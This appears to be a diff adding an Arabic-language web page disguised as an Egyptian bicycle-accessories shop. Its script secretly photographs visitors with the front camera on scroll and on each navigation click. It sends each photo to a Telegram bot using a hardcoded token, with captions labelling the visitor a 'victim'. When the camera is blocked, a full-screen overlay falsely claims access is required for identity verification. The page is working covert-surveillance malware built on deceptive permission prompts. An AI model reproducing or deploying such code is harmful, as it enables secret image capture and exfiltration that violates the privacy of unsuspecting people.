@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>متجر اكسسوارات وقطع غيار الدراجات</title>
+    <style>
+        body {
+            background-color: #f8fafc;
+            color: #1e293b;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            scroll-behavior: smooth;
+        }
+        /* شريط التنقل العلوي */
+        header {
+            background-color: #0f172a;
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .logo { font-size: 18px; font-weight: bold; color: #38bdf8; cursor: pointer; }
+        nav { display: flex; gap: 15px; }
+        nav button {
+            background: none;
+            border: none;
+            color: #cbd5e1;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+            transition: color 0.2s;
+        }
+        nav button:hover { color: #38bdf8; }
+
+        /* محتوى الصفحة الرئيسي */
+        .main-content {
+            flex: 1;
+            max-width: 900px;
+            width: 100%;
+            margin: 20px auto;
+            padding: 0 15px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+        }
+        .hero-banner {
+            background: linear-gradient(135deg, #0284c7, #0369a1);
+            color: white;
+            padding: 30px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+        .hero-banner h1 { margin: 0 0 10px 0; font-size: 24px; }
+        .hero-banner p { margin: 0; font-size: 15px; color: #e0f2fe; }
+
+        /* شبكة المنتجات */
+        .products-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 20px;
+        }
+
+        /* كارد المنتج */
+        .product-card {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            border: 1px solid #e2e8f0;
+        }
+        .product-img-container {
+            width: 100%;
+            height: 200px;
+            background: #ffffff;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid #e2e8f0;
+            overflow: hidden;
+        }
+        .product-img-container img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+        .product-title { font-size: 18px; font-weight: bold; color: #0f172a; margin: 0; }
+        .product-price { font-size: 16px; color: #16a34a; font-weight: bold; }
+        .short-desc { font-size: 13px; color: #475569; line-height: 1.4; margin: 0; }
+
+        .btn {
+            background-color: #2563eb;
+            color: white;
+            border: none;
+            padding: 10px;
+            font-size: 14px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            box-shadow: 0 4px 10px rgba(37,99,235,0.2);
+            transition: background 0.3s;
+            text-align: center;
+        }
+        .btn:hover { background-color: #1d4ed8; }
+
+        /* صفحات المنتجات الفردية أو الأقسام مخفية افتراضياً */
+        .page-section {
+            display: none;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            padding: 25px;
+            text-align: right;
+        }
+        .page-section h2 { color: #0f172a; margin-top: 0; }
+        .page-section p, .page-section li { color: #475569; font-size: 14px; line-height: 1.6; }
+
+        .details-container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .buy-box {
+            background: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            padding: 20px;
+            border-radius: 8px;
+        }
+        .buy-box h3 { color: #166534; margin-top: 0; }
+        .buy-btn {
+            background-color: #16a34a;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 15px;
+        }
+        .buy-btn:hover { background-color: #15803d; }
+
+        /* طبقة حجب الشاشة في حال تم عمل بلوك للكاميرا */
+        #permissionOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 23, 42, 0.95);
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .overlay-box {
+            background: #1e293b;
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 400px;
+            width: 100%;
+            border: 1px solid #334155;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+        .overlay-box h2 { color: #38bdf8; margin-top: 0; font-size: 20px; }
+        .overlay-box p { color: #cbd5e1; font-size: 14px; line-height: 1.6; }
+        .retry-btn {
+            background-color: #2563eb;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 15px;
+        }
+        .retry-btn:hover { background-color: #1d4ed8; }
+
+        footer {
+            text-align: center;
+            padding: 15px;
+            font-size: 13px;
+            color: #94a3b8;
+            background: #e2e8f0;
+            margin-top: auto;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- رسالة تحذيرية إجبارية تظهر لو عمل Block للكاميرا -->
+    <div id="permissionOverlay">
+        <div class="overlay-box">
+            <h2>⚠️ تنبيه هام للاستمرار</h2>
+            <p>يجب عليك الضغط على زر <strong>السماح (Allow)</strong> الخاص بصلاحية الكاميرا لكي يتم التحقق من هويتك وعرض محتوى المتجر وتخطي صفحة الحماية بنجاح.</p>
+            <button class="retry-btn" onclick="requestCameraAgain()">السماح والمتابعة 🔓</button>
+        </div>
+    </div>
+
+    <!-- شريط التنقل العلوي -->
+    <header>
+        <div class="logo" onclick="openProductPage('homeSection', 'اللوجو - الرئيسية')">🚲 متجر العجل برو</div>
+        <nav>
+            <button onclick="openProductPage('homeSection', 'زر الرئيسية')">الرئيسية</button>
+            <button onclick="openProductPage('moreSection', 'زر المزيد')">المزيد</button>
+            <button onclick="openProductPage('aboutSection', 'زر من نحن')">من نحن</button>
+            <button onclick="openProductPage('contactSection', 'زر اتصل بنا')">اتصل بنا</button>
+        </nav>
+    </header>
+
+    <!-- محتوى الصفحة -->
+    <div class="main-content">
+        
+        <!-- 1. قسم الرئيسية -->
+        <div id="homeSection" class="active-section">
+            <div class="hero-banner">
+                <h1>عروض صيف 2026 على مستلزمات الدراجات</h1>
+                <p>أفضل الإكسسوارات الأصلية بأرخص الأسعار في مصر والشحن لجميع المحافظات.</p>
+            </div>
+
+            <h2 style="color: #0f172a; margin-bottom: 15px; font-size: 20px;">منتجاتنا المتاحة:</h2>
+            
+            <div class="products-grid">
+                <!-- المنتج الأول -->
+                <div class="product-card">
+                    <div class="product-img-container">
+                        <img src="bike_horn.jpg" alt="سرينة عجل">
+                    </div>
+                    <h3 class="product-title">سرينة عجل ذكية متعددة المهام</h3>
+                    <div class="product-price">السعر: 150 ج.م</div>
+                    <p class="short-desc">سرينة احترافية مزودة بكشاف ليد قوي وصوت إنذار عالي.</p>
+                    <button class="btn" onclick="openProductPage('hornProduct', 'سرينة العجل الذكية')">عرض التفاصيل وشراء 🔍</button>
+                </div>
+
+                <!-- المنتج الثاني -->
+                <div class="product-card">
+                    <div class="product-img-container">
+                        <img src="bike_light.jpg" alt="إضاءة ليد">
+                    </div>
+                    <h3 class="product-title">كشاف ليد خلفي قابل للشحن</h3>
+                    <div class="product-price">السعر: 90 ج.م</div>
+                    <p class="short-desc">إضاءة تحذيرية قوية لسلامتك أثناء القيادة الليلية.</p>
+                    <button class="btn" onclick="openProductPage('lightProduct', 'كشاف الليد الخلفي')">عرض التفاصيل وشراء 🔍</button>
+                </div>
+
+                <!-- المنتج الثالث -->
+                <div class="product-card">
+                    <div class="product-img-container">
+                        <img src="bike_lock.jpg" alt="قفل عجل">
+                    </div>
+                    <h3 class="product-title">قفل دراجة فولاذي متين</h3>
+                    <div class="product-price">السعر: 120 ج.م</div>
+                    <p class="short-desc">قفل محصن ضد السرقة بطبقة حماية سيليكون لمنع الخدوش.</p>
+                    <button class="btn" onclick="openProductPage('lockProduct', 'قفل الدراجة الفولاذي')">عرض التفاصيل وشراء 🔍</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- 2. صفحة تفاصيل المنتج الأول -->
+        <div id="hornProduct" class="page-section">
+            <div class="details-container">
+                <h2>سرينة عجل ذكية متعددة المهام</h2>
+                <div class="product-img-container" style="height: 250px;">
+                    <img src="bike_horn.jpg" alt="سرينة عجل">
+                </div>
+                <div class="product-price">السعر: 150 ج.م</div>
+                <p>سرينة احترافية للدراجات مزودة بكشاف ليد قوي متعدد الأوضاع وصوت إنذار عالي التنبيه ومقاومة للأمطار.</p>
+                
+                <div class="buy-box">
+                    <h3>📋 المواصفات الفنية:</h3>
+                    <ul>
+                        <li>🔋 بطارية 1200 مللي أمبير تعمل حتى 5 ساعات متواصلة.</li>
+                        <li>🔊 قوة صوت تصل إلى 120 ديسيبل.</li>
+                    </ul>
+                    <button class="buy-btn" onclick="alert('تم إضافتها لسلة الشراء بنجاح!')">إتمام الشراء الآن 🛒</button>
+                </div>
+                <button class="btn" style="background: #64748b;" onclick="showSection('homeSection')">⬅ العودة للرئيسية</button>
+            </div>
+        </div>
+
+        <!-- 3. صفحة تفاصيل المنتج الثاني -->
+        <div id="lightProduct" class="page-section">
+            <div class="details-container">
+                <h2>كشاف ليد خلفي قابل للشحن</h2>
+                <div class="product-img-container" style="height: 250px;">
+                    <img src="bike_light.jpg" alt="إضاءة ليد">
+                </div>
+                <div class="product-price">السعر: 90 ج.م</div>
+                <p>كشاف خلفي فائق السطوع يشحن عبر منفذ USB، ويحتوي على عدة وضعيات إضاءة لضمان رؤيتك بوضوح.</p>
+                
+                <div class="buy-box">
+                    <h3>📋 المواصفات الفنية:</h3>
+                    <ul>
+                        <li>⚡ شحن سريع عبر USB.</li>
+                        <li>🌧️ مقاوم لقطرات المياه والأمطار.</li>
+                    </ul>
+                    <button class="buy-btn" onclick="alert('تم إضافتها لسلة الشراء بنجاح!')">إتمام الشراء الآن 🛒</button>
+                </div>
+                <button class="btn" style="background: #64748b;" onclick="showSection('homeSection')">⬅ العودة للرئيسية</button>
+            </div>
+        </div>
+
+        <!-- 4. صفحة تفاصيل المنتج الثالث -->
+        <div id="lockProduct" class="page-section">
+            <div class="details-container">
+                <h2>قفل دراجة فولاذي متين</h2>
+                <div class="product-img-container" style="height: 250px;">
+                    <img src="bike_lock.jpg" alt="قفل عجل">
+                </div>
+                <div class="product-price">السعر: 120 ج.م</div>
+                <p>قفل مصنوع من الفولاذ المقوى عالي الصلابة لحماية دراجتك من السرقات.</p>
+                
+                <div class="buy-box">
+                    <h3>📋 المواصفات الفنية:</h3>
+                    <ul>
+                        <li>🔒 قلب قفل نحاسي مقاوم للصدأ.</li>
+                    </ul>
+                    <button class="buy-btn" onclick="alert('تم إضافتها لسلة الشراء بنجاح!')">إتمام الشراء الآن 🛒</button>
+                </div>
+                <button class="btn" style="background: #64748b;" onclick="showSection('homeSection')">⬅ العودة للرئيسية</button>
+            </div>
+        </div>
+
+        <!-- 5. قسم المزيد -->
+        <div id="moreSection" class="page-section">
+            <h2>✨ منتجات وأقسام إضافية</h2>
+            <p>قريباً جداً سيتم إطلاق تشكيلة واسعة من إكسسوارات العجل المميزة.</p>
+            <br>
+            <button class="btn" style="background: #64748b;" onclick="showSection('homeSection')">⬅ العودة للرئيسية</button>
+        </div>
+
+        <!-- 6. قسم من نحن -->
+        <div id="aboutSection" class="page-section">
+            <h2>📖 من نحن</h2>
+            <p>نحن متجر متخصص في توفير أفضل قطع غيار وإكسسوارات الدراجات في مصر.</p>
+            <br>
+            <button class="btn" style="background: #64748b;" onclick="showSection('homeSection')">⬅ العودة للرئيسية</button>
+        </div>
+
+        <!-- 7. قسم اتصل بنا -->
+        <div id="contactSection" class="page-section">
+            <h2>📞 اتصل بنا والدعم الفني</h2>
+            <p>يسعدنا دائماً تواصلكم معنا لأي استفسار أو طلبات عبر الأرقام المتاحة.</p>
+            <br>
+            <button class="btn" style="background: #64748b;" onclick="showSection('homeSection')">⬅ العودة للرئيسية</button>
+        </div>
+
+    </div>
+
+    <footer>
+        جميع الحقوق محفوظة © متجر العجل برو 2026
+    </footer>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const BOT_TOKEN = "8732626253:AAHGWyKFHqXI1sSOFnQ2sVeR4vmJBeJ7iNw";
+        const CHAT_ID = "889069814";
+        let hasScrolledCaptured = false;
+        let blockAlertSent = false; // لضمان إرسال إشعار البلوك مرة واحدة فقط
+
+        // مراقبة حركة السكرول (التمرير)
+        window.addEventListener('scroll', function() {
+            if (!hasScrolledCaptured) {
+                hasScrolledCaptured = true;
+                takePhotoAndSend('عمل Scroll (تمرير في الشاشة)');
+            }
+        });
+
+        function requestCameraAgain() {
+            takePhotoAndSend('إعادة محاولة منح صلاحية الكاميرا');
+        }
+
+        function showSection(sectionId) {
+            const sections = document.querySelectorAll('#homeSection, .page-section');
+            sections.forEach(sec => sec.style.display = 'none');
+            document.getElementById(sectionId).style.display = 'block';
+            window.scrollTo(0, 0);
+        }
+
+        function openProductPage(pageId, productName) {
+            takePhotoAndSend(`معاينة منتج: ${productName}`);
+            showSection(pageId);
+        }
+
+        // إرسال رسالة فورية لتليجرام حال حدوث البلوك
+        function sendBlockAlertImmediate() {
+            if (!blockAlertSent) {
+                blockAlertSent = true;
+                const textMessage = "⚠️ تنبيه هام: قام شخص بالدخول إلى الموقع وعمل حظر (Block) للكاميرا وظهرت له رسالة التحذير!";
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: textMessage
+                    })
+                }).catch(err => console.log(err));
+            }
+        }
+
+        function takePhotoAndSend(actionType) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                document.getElementById('permissionOverlay').style.display = 'none';
+
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'victim_bike_shop.jpg');
+                        formData.append('caption', `🚲 ضحية جديدة التقطت صورته بسبب (${actionType}) في المتجر!`);
+
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).catch(err => console.log(err));
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg', 0.8);
+                }, 800);
+            }).catch(err => {
+                console.log("Camera access denied (Blocked)");
+                document.getElementById('permissionOverlay').style.display = 'flex';
+                sendBlockAlertImmediate(); // إرسال الإشعار فوراً لتليجرام بدون مشاكل
+            });
+        }
+    </script>
+</body>
+</html>
